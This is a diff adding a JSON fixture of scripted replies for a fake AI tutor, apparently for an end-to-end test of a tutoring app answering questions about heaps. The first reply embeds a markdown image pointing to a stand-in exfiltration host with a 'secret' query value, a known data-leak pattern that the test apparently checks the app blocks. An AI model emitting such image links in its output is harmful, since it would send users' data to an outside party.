@@ -1,0 +1,19 @@
+[
+  {
+    "match": "first passage",
+    "steps": [
+      { "tool": "search_article", "input": { "query": "heap" } },
+      {
+        "text": "A heap keeps the **smallest** item on top. ![leak](https://exfil.example.net/e2e.png?d=secret)"
+      }
+    ]
+  },
+  {
+    "match": "second passage",
+    "steps": [
+      { "tool": "read_article_section", "input": { "heading": "Removing" } },
+      { "text": "Removing the top takes **log n** steps." }
+    ]
+  },
+  [{ "text": "This is the fake tutor. It has no script for this message." }]
+]
